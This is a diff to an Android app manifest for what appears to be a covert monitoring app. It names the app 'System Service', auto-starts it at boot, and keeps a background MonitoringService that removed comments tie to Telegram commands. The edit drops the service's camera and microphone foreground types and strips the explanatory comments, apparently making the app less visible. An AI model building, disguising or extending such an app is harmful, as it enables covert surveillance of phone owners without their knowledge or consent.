@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Internet - Telegram සහ commands -->
+    <!-- Internet -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     
@@ -28,16 +28,16 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     
-    <!-- Boot එකේ auto-start -->
+    <!-- Boot auto-start -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
-    <service
-    android:name=".MonitoringService"
-    android:enabled="true"
-    android:exported="false"
-    android:foregroundServiceType="dataSync" />
+    <application
+        android:allowBackup="true"
+        android:label="System Service"
+        android:theme="@style/Theme.AppCompat.Light"
+        android:usesCleartextTraffic="true">
         
         <activity
             android:name=".MainActivity"
@@ -52,7 +52,7 @@
             android:name=".MonitoringService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone|dataSync" />
+            android:foregroundServiceType="dataSync" />
         
         <receiver
             android:name=".BootReceiver"
